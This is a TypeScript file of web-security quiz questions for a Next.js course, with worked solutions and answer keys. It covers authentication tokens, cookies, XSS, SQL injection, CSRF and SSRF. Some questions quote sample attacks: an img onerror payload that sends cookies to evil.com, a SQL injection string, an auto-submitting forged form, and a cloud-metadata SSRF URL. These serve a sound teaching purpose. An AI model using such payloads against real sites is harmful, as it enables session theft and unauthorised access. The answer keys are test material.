import {
  Question,
  QuestionType,
  Difficulty,
  Topic,
  Course,
  CodeLanguage,
} from '../types';

export const securityQuestions: Question[] = [

  // =====================================================================
  // 1. AUTHENTICATION DEEP DIVE (10 questions, topic: NEXT_AUTH)
  // =====================================================================

  {
    id: 'sec-auth-1',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.NEXT_AUTH,
    course: Course.WEB_DEV,
    question: 'A user clicks "Login with Google" on your Next.js app. What is the correct sequence of events in the OAuth 2.0 Authorization Code flow with PKCE?',
    options: [
      { id: 'a', text: 'Your app makes a code_verifier and its hash, the code_challenge, and sends the user to Google with the challenge. Google signs them in and returns a code. Your server swaps the code plus the verifier for tokens.', isCorrect: true },
      { id: 'b', text: 'Your app sends the user to Google with the client secret in the URL. Google signs them in and returns a code. Your server swaps the code plus the secret for tokens, and PKCE is that secret.', isCorrect: false },
      { id: 'c', text: 'Your app sends the user to Google, which signs them in and puts the access token straight in the redirect URL; PKCE replaces the server-side code exchange.', isCorrect: false },
      { id: 'd', text: 'Your app sends the user to Google with the code_verifier. Google returns the code_challenge, and your server swaps that challenge for tokens with no further secret.', isCorrect: false },
    ],
    explanation: 'The Authorization Code flow with PKCE has four steps. (1) Your app makes a random code_verifier and derives the code_challenge from it (its SHA-256 hash). (2) It sends the user to Google\'s sign-in page with the challenge. (3) After the user consents, Google redirects back with a short-lived authorization code. (4) Your server sends the code and the original verifier to Google and gets the tokens. An attacker who steals the code cannot use it without the verifier, which never left your app. The client secret is never put in a URL, tokens are not put in the redirect URL (that was the old implicit flow), and the verifier travels only in the last step: sending it first would give the secret away.',
    hints: [
      'PKCE adds a code_verifier/code_challenge pair to prevent authorization code interception',
      'Tokens are never sent through the browser URL -- they come from a server-to-server exchange',
    ],
    tags: ['oauth', 'pkce', 'authentication', 'google-login'],
    concepts: ['web-security-auth-tokens'],
  },

  {
    id: 'sec-auth-2',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.NEXT_AUTH,
    course: Course.WEB_DEV,
    question: 'A JWT looks like: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjN9.SIGNATURE_HERE\n\nWhat does each of the three dot-separated parts contain, and why is the payload Base64-encoded rather than encrypted?',
    options: [
      { id: 'a', text: 'Header (algorithm and token type), payload (claims, encrypted with the secret so only your server can read them), signature (a checksum of the payload).', isCorrect: false },
      { id: 'b', text: 'Header (algorithm and token type), payload (claims such as user_id and exp), signature (over header and payload). Base64url is only encoding, so anyone can read the payload; the signature proves it was not changed.', isCorrect: true },
      { id: 'c', text: 'Header (algorithm and token type), payload (claims), signature (the server\'s public key). Base64 hides the claims well enough, so nobody without the key can read them.', isCorrect: false },
      { id: 'd', text: 'Header (the user\'s identity), payload (claims), signature (the user\'s password hash, so the server can check it without a database).', isCorrect: false },
    ],
    explanation: 'A JWT has three Base64url-encoded parts separated by dots. The header names the signing algorithm (such as HS256 or RS256). The payload holds the claims: user_id, email, exp (expiry), iat (issued at). The signature is computed over the header and payload with a secret or private key. Base64url is an encoding, not encryption: anyone can decode the payload, so never put secrets such as passwords in it. The signature gives integrity (nobody changed the data) and authenticity (someone with the key signed it), not secrecy.',
    hints: [
      'Try decoding a JWT payload at jwt.io -- you\'ll see the claims in plain JSON',
      'Base64 is reversible by anyone. Encryption requires a key to reverse.',
    ],
    tags: ['jwt', 'tokens', 'base64', 'authentication'],
    concepts: ['web-security-auth-tokens'],
  },

  {
    id: 'sec-auth-3',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.NEXT_AUTH,
    course: Course.WEB_DEV,
    question: 'Your app uses JWT-based authentication. After login, the user gets an access token (15 min) and a refresh token (7 days). Why use two separate tokens instead of one long-lived access token?',
    options: [
      { id: 'a', text: 'Two tokens are faster: the server checks the small access token on most requests and reads the refresh token only at login.', isCorrect: false },
      { id: 'b', text: 'The refresh token decrypts the access token, so a stolen access token is useless without the refresh token beside it.', isCorrect: false },
      { id: 'c', text: 'A stolen access token works for at most 15 minutes, and the refresh token is kept in an httpOnly cookie and sent only to the refresh endpoint.', isCorrect: true },
      { id: 'd', text: 'One long-lived token is fine over HTTPS: a JWT is signed, so it cannot be stolen or replayed, and two tokens only add work.', isCorrect: false },
    ],
    explanation: 'Two tokens limit the damage of a theft. The access token is short-lived (15 minutes) and sent with every API request, so a stolen one is useful only briefly. The refresh token lives longer (7 days) but is sent only to one refresh endpoint, so it is exposed far less, and when the access token expires the client uses it to get a new one without a new login. Keep the refresh token in an httpOnly cookie, and the access token in memory or an httpOnly cookie, never in localStorage, where any injected script can read it. A signature stops tampering, not copying: a stolen signed token still works.',
    hints: [
      'Think about what happens when a token is stolen -- how do you limit the damage?',
      'The refresh token is sent to fewer endpoints, reducing its exposure surface',
    ],
    tags: ['jwt', 'refresh-tokens', 'token-storage', 'authentication'],
    concepts: ['web-security-auth-tokens'],
  },

  {
    id: 'sec-auth-4',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.NEXT_AUTH,
    course: Course.WEB_DEV,
    question: 'You need to store authentication tokens in a Next.js app. A teammate suggests localStorage. What are the security tradeoffs of localStorage, sessionStorage, and httpOnly cookies for token storage?',
    options: [
      { id: 'a', text: 'localStorage is the safest because it persists across sessions; sessionStorage is weaker because it clears with the tab; cookies are weakest because every request sends them.', isCorrect: false },
      { id: 'b', text: 'All three are equally safe over HTTPS, since HTTPS encrypts everything; the choice is only convenience, such as localStorage for SPAs.', isCorrect: false },
      { id: 'c', text: 'httpOnly cookies are obsolete because modern browsers block them, so localStorage holding an encrypted token is the current best practice.', isCorrect: false },
      { id: 'd', text: 'Any injected script can read localStorage and sessionStorage; an httpOnly cookie is hidden from scripts but sent automatically, so it needs SameSite or CSRF tokens.', isCorrect: true },
    ],
    explanation: 'XSS (cross-site scripting) is the main threat to stored tokens: a script injected into your page can call localStorage.getItem() or read document.cookie and send the token away. sessionStorage is just as readable, only scoped to the tab. An httpOnly cookie is not visible to JavaScript at all (document.cookie leaves it out), so XSS cannot read it. Cookies are sent with requests automatically, though, which opens CSRF (cross-site request forgery): set SameSite=Lax or Strict, or use CSRF tokens. HTTPS protects tokens in transit, not from scripts on the page. A common setup is a refresh token in an httpOnly, Secure, SameSite cookie and the access token in memory.',
    hints: [
      'XSS lets an attacker run arbitrary JavaScript on your page. What can JavaScript access?',
      'httpOnly is a cookie flag that prevents JavaScript from reading the cookie value',
    ],
    tags: ['xss', 'csrf', 'cookies', 'token-storage', 'security'],
    concepts: ['web-security-xss', 'web-security-csrf', 'web-security-input-validation'],
  },

  // BEGINNER faded (Parsons + Cloze) — jose's jwtVerify is a new primitive, never faded elsewhere before this topic's lone ADVANCED coding question

  {
    id: 'sec-auth-parsons-1',
    type: QuestionType.PARSONS,
    difficulty: Difficulty.BEGINNER,
    topic: Topic.NEXT_AUTH,
    course: Course.WEB_DEV,
    language: CodeLanguage.TYPESCRIPT,
    question:
      'Assemble an async function isValidToken(token) that returns true when the jose library verifies the JWT against the JWT_SECRET environment variable, and false when verification throws.',
    correctOrder: [
      'import { jwtVerify } from "jose";',
      'const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET || "your-secret-key");',
      'async function isValidToken(token: string) {',
      '  try {',
      '    await jwtVerify(token, JWT_SECRET);',
      '    return true;',
      '  } catch {',
      '    return false;',
      '  }',
      '}',
    ],
    distractorLines: [
      'import jwtVerify from "jose";',
      '    const valid = jwtVerify(token, JWT_SECRET);',
    ],
    solution: `import { jwtVerify } from "jose";
const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET || "your-secret-key");
async function isValidToken(token: string) {
  try {
    await jwtVerify(token, JWT_SECRET);
    return true;
  } catch {
    return false;
  }
}`,
    explanation:
      'jose exports jwtVerify by name, not as a default export. The key must be a Uint8Array, which is why the secret string goes through new TextEncoder().encode(). jwtVerify is async and throws when the token is expired, malformed or wrongly signed, so the pattern is to await it inside try: reaching the next line means valid, and a thrown error means invalid. Without await (the distractor), the Promise is never checked and the function returns true for any token.',
    hints: ['jose exports jwtVerify by name: { jwtVerify }, not a default export', 'The secret must be encoded to a Uint8Array first', 'jwtVerify throws on an invalid or expired token: it does not return false'],
    tags: ['jwt', 'jose', 'jwtVerify', 'parsons'],
    concepts: ['web-security-auth-tokens'],
  },

  {
    id: 'sec-auth-cloze-1',
    type: QuestionType.CLOZE_CODE,
    difficulty: Difficulty.BEGINNER,
    topic: Topic.NEXT_AUTH,
    course: Course.WEB_DEV,
    language: CodeLanguage.TYPESCRIPT,
    question:
      'Complete the code: the TextEncoder method that turns the secret string into a Uint8Array, and the jose function that verifies a token against it.',
    template: `import { jwtVerify } from "jose";

const JWT_SECRET = new TextEncoder().___(process.env.JWT_SECRET || "your-secret-key");

async function isValidToken(token: string) {
  try {
    await ___(token, JWT_SECRET);
    return true;
  } catch {
    return false;
  }
}`,
    blanks: ['encode', 'jwtVerify'],
    solution: `import { jwtVerify } from "jose";

const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET || "your-secret-key");

async function isValidToken(token: string) {
  try {
    await jwtVerify(token, JWT_SECRET);
    return true;
  } catch {
    return false;
  }
}`,
    explanation:
      'jose\'s APIs work with raw bytes rather than strings, so TextEncoder().encode() converts the secret into the Uint8Array jwtVerify expects. jwtVerify(token, secret) resolves if the signature and expiry are valid, and throws otherwise.',
    hints: [
      'The TextEncoder method that produces a Uint8Array',
      'The jose function that checks a token\'s signature and expiry',
    ],
    tags: ['jwt', 'jose', 'jwtVerify', 'cloze'],
    concepts: ['web-security-auth-tokens'],
  },

  {
    id: 'sec-auth-5',
    type: QuestionType.CODING,
    difficulty: Difficulty.ADVANCED,
    topic: Topic.NEXT_AUTH,
    course: Course.WEB_DEV,
    language: CodeLanguage.TYPESCRIPT,
    question: 'Implement a Next.js middleware that protects routes by checking for a valid JWT in cookies. If the token is missing or expired, redirect to /login. If valid, allow the request to proceed. Use the jose library for JWT verification.\n\nThe middleware should:\n1. Read the "access_token" from cookies\n2. Verify it using jose\'s jwtVerify with a secret key\n3. Redirect to /login if verification fails\n4. Only apply to routes under /dashboard and /api (not /login, /register, or static files)',
    starterCode: `// Setup imports and secret key
// Middleware logic to verify token and redirect
// Route matcher configuration
`,
    testCases: [
      {
        input: 'Request to /dashboard with no access_token cookie',
        expectedOutput: 'redirect to /login',
        description: 'Should redirect to /login when no token is present',
      },
      {
        input: 'Request to /dashboard with expired JWT in access_token cookie',
        expectedOutput: 'redirect to /login',
        description: 'Should redirect to /login when token is expired',
      },
      {
        input: 'Request to /dashboard with valid JWT in access_token cookie',
        expectedOutput: 'NextResponse.next()',
        description: 'Should allow the request to proceed with a valid token',
      },
      {
        input: 'Request to /login (no token)',
        expectedOutput: 'NextResponse.next()',
        description: 'Should not intercept /login route (not in matcher)',
      },
    ],
    solution: `import { NextRequest, NextResponse } from 'next/server';\nimport { jwtVerify } from 'jose';\n\nconst JWT_SECRET = new TextEncoder().encode(\n  process.env.JWT_SECRET || 'your-secret-key'\n);\n\nexport async function middleware(request: NextRequest) {\n  const token = request.cookies.get('access_token')?.value;\n\n  if (!token) {\n    return NextResponse.redirect(new URL('/login', request.url));\n  }\n\n  try {\n    await jwtVerify(token, JWT_SECRET);\n    return NextResponse.next();\n  } catch (error) {\n    return NextResponse.redirect(new URL('/login', request.url));\n  }\n}\n\nexport const config = {\n  matcher: ['/dashboard/:path*', '/api/:path*'],\n};\n# OR\nimport { NextRequest, NextResponse } from 'next/server';\nimport { jwtVerify } from 'jose';\n\nconst JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET);\n\nexport async function middleware(request: NextRequest) {\n  const token = request.cookies.get('access_token')?.value;\n  const login = new URL('/login', request.url);\n\n  if (!token) return NextResponse.redirect(login);\n\n  try {\n    await jwtVerify(token, JWT_SECRET);\n  } catch {\n    return NextResponse.redirect(login);\n  }\n  return NextResponse.next();\n}\n\nexport const config = {\n  matcher: ['/dashboard/:path*', '/api/:path*'],\n};`,
    requires: [/import\s*\{\s*jwtVerify\s*\}\s*from\s*["']jose["']/, /new\s+TextEncoder\(\)\.encode\(/, /export\s+async\s+function\s+middleware\s*\(/, /request\.cookies\.get\(\s*["']access_token["']\s*\)/, /await\s+jwtVerify\(/, /catch/, /NextResponse\.redirect\(/, /NextResponse\.next\(\)/, /["']\/dashboard\/:path\*["']/, /["']\/api\/:path\*["']/],
    explanation: 'Middleware runs before every matched request. (1) request.cookies.get() can read an httpOnly cookie: scripts in the browser cannot, but middleware runs on the server. (2) jwtVerify from jose throws when the token is expired, wrongly signed or malformed, so the catch branch redirects all three to /login, and a missing cookie is redirected before any verification. (3) The matcher limits the check to /dashboard and /api and everything below them, so /login, /register and static files are never checked. (4) JWT_SECRET must be a strong random value from the environment, never hardcoded; the "your-secret-key" fallback is only for local practice. Check the session again where data is read or changed, since middleware is the first gate, not the only one.',
    tieredHints: {
      apiSignature: 'jwtVerify(jwt: string, key: Uint8Array): Promise<JWTVerifyResult>  (throws when invalid)',
      skeleton: 'import { NextRequest, NextResponse } from \'next/server\';\nimport { jwtVerify } from \'jose\';\n\nconst JWT_SECRET = ____;\n\nexport async function middleware(request: NextRequest) {\n  const token = ____;\n\n  if (!token) {\n    return ____;\n  }\n\n  try {\n    ____;\n    return ____;\n  } catch {\n    return ____;\n  }\n}\n\nexport const config = {\n  matcher: ____,\n};',
    },
    hints: ['Use request.cookies.get("access_token")?.value to read the cookie', 'jwtVerify throws for expired or invalid tokens: wrap it in try/catch', 'The matcher array uses route patterns like /dashboard/:path*'],
    tags: ['nextjs', 'middleware', 'jwt', 'jose', 'authentication', 'cookies'],
    concepts: ['next-middleware', 'web-security-auth-tokens', 'web-security-csrf'],
  },

  {
    id: 'next-auth-session-cookie-cloze-1',
    type: QuestionType.CLOZE_CODE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.NEXT_AUTH,
    course: Course.WEB_DEV,
    language: CodeLanguage.TYPESCRIPT,
    question: 'Fill in the next/headers import used to access cookies, and the cookie option that keeps it out of reach of client-side JavaScript.',
    template: 'import { ___ } from "next/headers";\n\nexport async function login(formData: FormData) {\n  "use server";\n  const token = await createSessionToken(formData);\n  const cookieStore = await cookies();\n  cookieStore.set("session", token, { ___: true, secure: true, sameSite: "lax" });\n}',
    blanks: ['cookies', 'httpOnly'],
    solution: 'import { cookies } from "next/headers";\n\nexport async function login(formData: FormData) {\n  "use server";\n  const token = await createSessionToken(formData);\n  const cookieStore = await cookies();\n  cookieStore.set("session", token, { httpOnly: true, secure: true, sameSite: "lax" });\n}',
    explanation: 'cookies() from next/headers gives Server Actions and route handlers read and write access to cookies. httpOnly: true means scripts in the browser cannot read the session cookie through document.cookie: only the server, and the browser when it sends requests, ever see it. That is the main defence against a session token being stolen by XSS.',
    hints: ['the next/headers function that returns the cookie store', 'the option that blocks client-side JS from reading the cookie'],
    tags: ['cookies', 'httpOnly', 'session', 'server-action'],
    concepts: ['web-security-auth-tokens'],
  },
  {
    id: 'next-auth-httponly-predict-1',
    type: QuestionType.PREDICT_OUTPUT,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.NEXT_AUTH,
    course: Course.WEB_DEV,
    language: CodeLanguage.JSX,
    question: 'The browser has no cookies for the site. A visitor clicks Sign in. What does the browser console log? Type the single logged line exactly.',
    code: `// app/actions.ts
"use server";
import { cookies } from "next/headers";

export async function signIn() {
  const store = await cookies();
  store.set("session", "abc123", { httpOnly: true, path: "/" });
  store.set("lang", "fr", { path: "/" });
}

// app/SignIn.tsx
"use client";
import { signIn } from "./actions";

export default function SignIn() {
  async function handleClick() {
    await signIn();
    console.log(document.cookie);
  }
  return <button onClick={handleClick}>Sign in</button>;
}`,
    expectedOutput: 'lang=fr',
    explanation: 'The Server Action runs on the server and sets both cookies on its response, so the browser stores both. httpOnly keeps the session cookie out of reach of JavaScript: document.cookie lists only the cookies scripts may read, so it shows "lang=fr" and never the session token. That is the point of an httpOnly session cookie: an injected script cannot read or steal it, while the browser still sends it with every request to the site.',
    hints: ['Does the browser store an httpOnly cookie at all?', 'Which cookies can document.cookie see?'],
    tags: ['httpOnly', 'cookies', 'server-action', 'session', 'predict'],
    concepts: ['web-security-auth-tokens'],
  },
  {
    id: 'next-auth-session-cookie-1',
    type: QuestionType.CODING,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.NEXT_AUTH,
    course: Course.WEB_DEV,
    language: CodeLanguage.TYPESCRIPT,
    question: 'Implement a Server Action that logs a user in by setting an httpOnly session cookie.\n\nFile: app/actions/auth.ts (the starter already marks the whole file "use server")\n\nRequirements:\n- Export an async function `login(formData: FormData)`\n- Get a token from `await verifyCredentials(formData)` (import it from "@/lib/auth"; it returns a session token string)\n- Get the cookie store from cookies() in next/headers (it returns a Promise in Next.js 15)\n- Set a cookie named "session" to the token, readable only by the server (httpOnly), sent only over HTTPS (secure), with sameSite "lax", lasting 7 days (maxAge is in seconds)',
    starterCode: `// app/actions/auth.ts\n"use server";\n\n// Import cookies and verifyCredentials\n\n// Implement login Server Action
`,
    testCases: [
      {
        input: 'verify credentials',
        expectedOutput: 'await verifyCredentials(formData)',
        description: 'Should verify credentials to obtain a session token',
      },
      {
        input: 'set httpOnly cookie',
        expectedOutput: 'cookieStore.set("session", token, { httpOnly: true, secure: true, sameSite: "lax", maxAge: 60 * 60 * 24 * 7 })',
        description: 'Should set an httpOnly session cookie with a 7-day expiry',
      },
    ],
    solution: `// app/actions/auth.ts\n"use server";\n\nimport { cookies } from "next/headers";\nimport { verifyCredentials } from "@/lib/auth";\n\nexport async function login(formData: FormData) {\n  const token = await verifyCredentials(formData);\n  const cookieStore = await cookies();\n\n  cookieStore.set("session", token, {\n    httpOnly: true,\n    secure: true,\n    sameSite: "lax",\n    maxAge: 60 * 60 * 24 * 7,\n  });\n}\n# OR\n"use server";\n\nimport { cookies } from "next/headers";\nimport { verifyCredentials } from "@/lib/auth";\n\nexport async function login(formData: FormData) {\n  const token = await verifyCredentials(formData);\n  (await cookies()).set("session", token, {\n    httpOnly: true,\n    secure: true,\n    sameSite: "lax",\n    maxAge: 604800,\n  });\n}`,
    requires: [/import\s*\{\s*cookies\s*\}\s*from\s*["']next\/headers["']/, /import\s*\{\s*verifyCredentials\s*\}\s*from\s*["']@\/lib\/auth["']/, /export\s+async\s+function\s+login\s*\(\s*formData/, /await\s+verifyCredentials\(\s*formData\s*\)/, /await\s+cookies\(\)/, /\.set\(\s*["']session["']/, /httpOnly\s*:\s*true/, /secure\s*:\s*true/, /sameSite\s*:\s*["']lax["']/, /maxAge\s*:\s*(60\s*\*\s*60\s*\*\s*24\s*\*\s*7|604800|7\s*\*\s*24\s*\*\s*60\s*\*\s*60)/],
    explanation: 'A Server Action runs on the server, so it can set an httpOnly cookie through cookies().set(): the browser stores it and sends it back, but no script can read the token through document.cookie. secure: true sends the cookie only over HTTPS, and sameSite: "lax" keeps it off most cross-site requests, which blocks the common CSRF case. maxAge is in seconds, so a week is 60 * 60 * 24 * 7, or 604800.',
    tieredHints: {
      apiSignature: 'const store = await cookies(); store.set(name: string, value: string, { httpOnly?, secure?, sameSite?, maxAge? })',
      skeleton: 'export async function login(formData: FormData) {\n  const token = ____;\n  const cookieStore = ____;\n\n  cookieStore.set("session", token, {\n    ____\n  });\n}',
    },
    hints: ['cookies() must be awaited before calling .set()', 'httpOnly, secure, sameSite and maxAge all go in one options object', 'maxAge counts seconds'],
    tags: ['server-action', 'cookies', 'httpOnly', 'session'],
    concepts: ['web-security-auth-tokens'],
  },
  {
    id: 'next-auth-logout-cloze-1',
    type: QuestionType.CLOZE_CODE,
    difficulty: Difficulty.BEGINNER,
    topic: Topic.NEXT_AUTH,
    course: Course.WEB_DEV,
    language: CodeLanguage.TYPESCRIPT,
    question: 'Fill in the cookie-store method that removes the session cookie, and the function that sends the user back to the login page.',
    template: 'import { cookies } from "next/headers";\nimport { redirect } from "next/navigation";\n\nexport async function logout() {\n  "use server";\n  const cookieStore = await cookies();\n  cookieStore.___("session");\n  ___("/login");\n}',
    blanks: ['delete', 'redirect'],
    solution: 'import { cookies } from "next/headers";\nimport { redirect } from "next/navigation";\n\nexport async function logout() {\n  "use server";\n  const cookieStore = await cookies();\n  cookieStore.delete("session");\n  redirect("/login");\n}',
    explanation: 'cookieStore.delete(name) removes the cookie by sending a Set-Cookie header that expires it immediately. redirect() (from next/navigation) then sends the now-logged-out user back to /login. Both work inside a Server Action marked "use server".',
    hints: ['the cookie-store method that removes a cookie by name', 'the next/navigation function for a server-side redirect'],
    tags: ['logout', 'cookies', 'redirect', 'server-action'],
    concepts: ['web-security-auth-tokens'],
  },

  // =====================================================================
  // 2. COMMON ATTACK VECTORS (5 questions, topic: API_DESIGN)
  // =====================================================================

  {
    id: 'sec-attack-1',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    question: `Your React app shows blog posts by passing each post's saved HTML to dangerouslySetInnerHTML. A user saves a post containing:

<img src="x" onerror="fetch('https://evil.com/steal?c=' + document.cookie)">

Every reader who opens the post now runs the onerror code. What kind of XSS is this, and what would have stopped it?`,
    options: [
      { id: 'a', text: 'Stored XSS: the payload is saved and runs for every reader; sanitise the HTML (DOMPurify) before rendering it raw', isCorrect: true },
      { id: 'b', text: 'Reflected XSS: the server echoes the tag back in its response, so escaping the URL\'s query string would stop it', isCorrect: false },
      { id: 'c', text: 'DOM XSS: React escapes everything it renders, dangerouslySetInnerHTML included, so this cannot run in React', isCorrect: false },
      { id: 'd', text: 'Not XSS at all: an img tag cannot run JavaScript, because browsers execute code only from inside script tags', isCorrect: false },
    ],
    explanation: `This is stored XSS: the attacker's markup is saved in your database and runs in the browser of everyone who views the post, which makes it the most damaging kind. Reflected XSS instead comes from the request itself (a script in a search URL that the page echoes back), and DOM XSS is your own client code putting untrusted data into the page through innerHTML, document.write or eval. Any attribute that takes code runs it: onerror fires as soon as the image fails to load. React escapes text you render with {post.body}, which is why plain JSX is safe; dangerouslySetInnerHTML turns that off, so sanitise the HTML first with a library such as DOMPurify, or render Markdown to safe elements instead. Two more layers help: a Content-Security-Policy without 'unsafe-inline' blocks inline handlers like onerror, and an httpOnly session cookie never appears in document.cookie.`,
    hints: [
      'Where does the payload live: in the URL, or in your database?',
      'What does dangerouslySetInnerHTML turn off?',
    ],
    tags: ['xss', 'stored-xss', 'reflected-xss', 'dom-xss', 'csp', 'react-security'],
    concepts: ['web-security-xss'],
  },

  {
    id: 'sec-attack-2',
    type: QuestionType.CODING,
    difficulty: Difficulty.BEGINNER,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    language: CodeLanguage.TYPESCRIPT,
    question: `This function is open to SQL injection: a username of ' OR '1'='1 returns every user.

async function findUserUnsafe(username: string) {
  return prisma.$queryRawUnsafe(
    \`SELECT id, email FROM "User" WHERE username = '\${username}'\`,
  );
}

Write two safe versions, each returning the id and email of the users with that username:
1. findUserRaw(username: string), which keeps the raw SQL but uses Prisma's $queryRaw tagged template, so the value is sent as a query parameter
2. findUserOrm(username: string), which uses prisma.user.findMany with a where filter and selects only id and email`,
    starterCode: `async function findUserRaw(username: string) {
}

async function findUserOrm(username: string) {
}
`,
    testCases: [
      { input: 'findUserRaw("\' OR \'1\'=\'1")', expectedOutput: '[] (no user has that name)', description: 'The input is sent as a parameter, never as SQL' },
      { input: 'findUserOrm("ada")', expectedOutput: '[{ id, email }] for ada', description: 'The ORM version filters by username and selects two fields' },
    ],
    solution: `async function findUserRaw(username: string) {
  return prisma.$queryRaw\`SELECT id, email FROM "User" WHERE username = \${username}\`;
}

async function findUserOrm(username: string) {
  return prisma.user.findMany({
    where: { username },
    select: { id: true, email: true },
  });
}`,
    explanation: `SQL injection happens when user input is pasted into the SQL text. In findUserUnsafe the username ' OR '1'='1 closes the quote and adds a condition that is always true, so the WHERE clause becomes username = '' OR '1'='1' and every row comes back; other inputs can read other tables or drop them. A query parameter keeps the value out of the SQL: the database receives the statement with a placeholder and the value separately, and treats the value only as data. Prisma's $queryRaw tagged template does that for every \${} in it (a tagged template receives the text pieces and the values separately, so Prisma never builds one string), while $queryRawUnsafe takes a finished string and has no way to tell your SQL from the user's; never pass it built-up text. Note there are no quotes around \${username}: the parameter is a value, not text inside a string literal. The ORM call is parameterized for you, which is why prisma.user.findMany is the default and raw SQL is kept for queries the ORM cannot express.`,
    tieredHints: {
      apiSignature: 'prisma.$queryRaw`...` tagged template: each interpolated value is sent as a query parameter',
      skeleton: `// findUserRaw
return prisma.____\`SELECT id, email FROM "User" WHERE ____\`;

// findUserOrm
return prisma.user.____({ ____ });`,
    },
    hints: [
      'The unsafe version builds the SQL text out of the user\'s input',
      'A tagged template sends each ${} value separately from the SQL text',
      'Prisma\'s query methods always use parameters',
    ],
    tags: [
      'sql-injection',
      'parameterized-queries',
      'prisma',
      'queryRaw',
      'security',
    ],
    concepts: ['web-security-input-validation'],
    requires: [
      /\$queryRaw\s*(`|\(\s*Prisma\.sql\s*`)/,
      /^(?![\s\S]*['"]\$\{)/,
      /^(?![\s\S]*\$queryRawUnsafe)/,
      /prisma\.user\.findMany\(/,
      /select:\s*\{/,
    ],
  },

  {
    id: 'sec-attack-3',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    question: `A user is logged into your banking app at bank.com, whose session cookie is set with SameSite=None. They visit a malicious site containing:

<form action="https://bank.com/api/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit()</script>

What attack is this, and which defences actually work?`,
    options: [
      { id: 'a', text: 'XSS, because the page runs a script; a Content-Security-Policy on bank.com and React\'s escaping would stop it', isCorrect: false },
      { id: 'b', text: 'CSRF: the browser attaches bank.com\'s cookie to the forged POST; SameSite=Lax or Strict and CSRF tokens stop it', isCorrect: true },
      { id: 'c', text: 'Clickjacking: the form is a hidden overlay on top of bank.com, and an X-Frame-Options: DENY header stops it', isCorrect: false },
      { id: 'd', text: 'Nothing happens: CORS stops a page on one origin from submitting a form to another, so the request never leaves', isCorrect: false },
    ],
    explanation: `This is Cross-Site Request Forgery (CSRF). The browser attaches cookies by the request's destination, not by which site started it, so the forged form POST to bank.com carries the user's session cookie and looks like a real transfer. The script runs on the attacker's own page, not on bank.com, so CSP on bank.com and React's escaping are irrelevant, and there is no frame to block. CORS does not help either: it stops a page from reading a cross-origin response, and a plain form submission is sent without any preflight. Defences: SameSite=Lax (cookies are not sent on cross-site POSTs) or Strict (not on any cross-site request); an anti-CSRF token in each form that the attacker cannot know; and checking the Origin header on state-changing requests. Chromium treats a cookie with no SameSite attribute as Lax, but other browsers may not, so set it explicitly. Next.js Server Actions accept only POST and compare the Origin header with the host for this reason.`,
    hints: [
      'Browsers attach cookies by where the request goes, not where it came from',
      'CORS blocks reading responses, not sending requests; forms are not preflighted',
    ],
    tags: ['csrf', 'samesite', 'csrf-token', 'cookies', 'security'],
    concepts: [
      'web-security-csrf',
    ],
  },

  {
    id: 'sec-attack-4',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.ADVANCED,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    question: `Your Next.js app has a link-preview feature: a Server Action receives a URL that the user pastes and runs const res = await fetch(url) on the server to read the page's title. An attacker submits http://169.254.169.254/latest/meta-data/iam/security-credentials/. What attack is this, and why is server-side fetching of user input risky?`,
    options: [
      { id: 'a', text: 'SQL injection: the URL carries a second query, and parameterized queries in the internal API would prevent it', isCorrect: false },
      { id: 'b', text: 'XSS: the attacker puts a URL into your page, and a Content-Security-Policy header would block the request', isCorrect: false },
      { id: 'c', text: 'SSRF: your server makes the request from inside your network; allow-list destinations and block private IPs', isCorrect: true },
      { id: 'd', text: 'Nothing: fetch on the Next.js server refuses private and link-local addresses, so the request never leaves', isCorrect: false },
    ],
    explanation: `This is Server-Side Request Forgery (SSRF): the attacker makes your server send a request on their behalf, from inside your network. 169.254.169.254 is the cloud metadata endpoint on AWS (and similar on other clouds), which can return the server's temporary credentials. Server Actions, route handlers and Server Components run on the server, which can reach internal services and metadata endpoints that the attacker's browser cannot, and fetch applies no restriction of its own. A browser CSP does nothing here, because the browser never makes this request. Defences: fetch only from an allow-list of hosts when you can; otherwise parse the URL, allow only http and https, resolve the host name and refuse private, loopback and link-local addresses (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x), and do not follow redirects blindly, since a public URL can redirect to an internal one. On AWS, requiring IMDSv2 (a token obtained with a PUT) blocks this simple GET.`,
    hints: [
      '169.254.169.254 is the cloud metadata endpoint, reachable only from inside the server\'s network',
      'Who actually makes the request: the attacker\'s browser, or your server?',
    ],
    tags: ['ssrf', 'server-components', 'aws', 'internal-network', 'security'],
    concepts: ['next-server-vs-client', 'web-security-input-validation'],
  },

  {
    id: 'sec-attack-5',
    type: QuestionType.CODING,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    language: CodeLanguage.TYPESCRIPT,
    question: `Login attempts must be limited to 5 per minute per IP address. In app/api/login/route.ts write a fixed-window rate limiter:
1. a Map from IP to { count, windowStart }
2. rateLimit(ip: string, now = Date.now()), which counts this request and returns { ok: true } while the IP has made at most 5 requests in its current 60-second window, and { ok: false, retryAfter } once it goes over, where retryAfter is the whole number of seconds until the window ends, rounded up; a request after the window has ended starts a new window with a count of 1
